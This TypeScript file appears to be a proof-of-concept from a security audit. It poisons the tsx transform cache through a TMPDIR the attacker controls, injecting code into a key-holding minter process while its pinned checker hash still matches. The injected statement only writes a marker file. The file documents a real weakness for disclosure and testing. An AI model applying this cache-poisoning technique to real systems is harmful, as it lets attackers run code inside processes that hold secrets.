// F9: foreign code in the key-holding minter process through the tsx transform cache, with the pinned checkerSha256.
// tsx 4.21 keeps compiled TypeScript in <os.tmpdir()>/tsx-<euid>/<time>-<key>; key = hash(source, options, esbuild
// version, tsx version) (public inputs); a disk entry is used WITHOUT any integrity or ownership check.
// Power used here: the environment variable TMPDIR (NOT refused by minter.ts; only NODE_OPTIONS is) pointing to a
// directory the attacker can write. Same mechanism without any variable: a writable <tmpdir>/tsx-<euid> (see report).
// Steps: (1) start the minter with TMPDIR=<dir> (tsx writes the real cache entries); (2) find the entry of minter.ts and
// prepend one statement that writes a marker file; (3) start again with the same TMPDIR; (4) compare the reported
// checkerSha256 with the pinned value (computed from the three source files) and look for the marker.
// Exit 1 = the marker was written by the minter process AND the ready line reports the pinned checkerSha256.
// Usage: f9_tsx_cache.ts <work dir>
import { existsSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { spawn } from "node:child_process";
import { CORE, ROOT, fresh, guard, done } from "./lib";
import { pinnedChecker, SPEC_LOCK } from "./raw";
const [work] = process.argv.slice(2);
function startOnce(tmp: string): Promise<any> {
  return new Promise((res, rej) => {
    const c = spawn(process.execPath, ["--import", "tsx", join(ROOT, "ts/refund-finality/minter.ts"), CORE, SPEC_LOCK, "on"],
      { cwd: ROOT, env: { PATH: process.env.PATH!, HOME: process.env.HOME!, LANG: "C", NODE_PATH: process.env.NODE_PATH ?? "", TMPDIR: tmp }, stdio: ["pipe", "pipe", "pipe"] });
    let out = "", err = ""; c.stderr.on("data", d => err += d);
    c.stdout.on("data", d => { out += d; const i = out.indexOf("\n"); if (i >= 0 && !(c as any)._done) { (c as any)._done = true; setTimeout(() => c.kill(), 2000); res({ ready: JSON.parse(out.slice(0, i)), err }); } });
    c.on("exit", code => { if (!out.includes("\n")) rej(new Error("exit " + code + " " + err)); });
  });
}
guard((async () => {
  fresh(work);
  const tmp = join(work, "tmpdir"), marker = join(work, "MARKER");
  (await import("node:fs")).mkdirSync(tmp);
  await startOnce(tmp);
  await new Promise(r => setTimeout(r, 1500));   // the cache writes are asynchronous
  const dir = join(tmp, readdirSync(tmp).find(n => n.startsWith("tsx-"))!);
  const entry = readdirSync(dir).find(n => readFileSync(join(dir, n), "utf8").includes("refused to start: NODE_OPTIONS is set"));
  if (!entry) throw new Error("no cache entry for minter.ts in " + dir);
  const v = JSON.parse(readFileSync(join(dir, entry), "utf8"));
  v.code = `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "foreign code ran in pid " + process.pid);` + v.code;
  writeFileSync(join(dir, entry), JSON.stringify(v));
  const second = await startOnce(tmp);
  const r = { cacheEntry: entry, reportedChecker: second.ready.checkerSha256, pinnedChecker: pinnedChecker(),
    markerWritten: existsSync(marker), marker: existsSync(marker) ? readFileSync(marker, "utf8") : null, stderrInfo: second.err.split("\n")[0].slice(0, 300) };
  done(r.markerWritten && r.reportedChecker === r.pinnedChecker, r);
})());
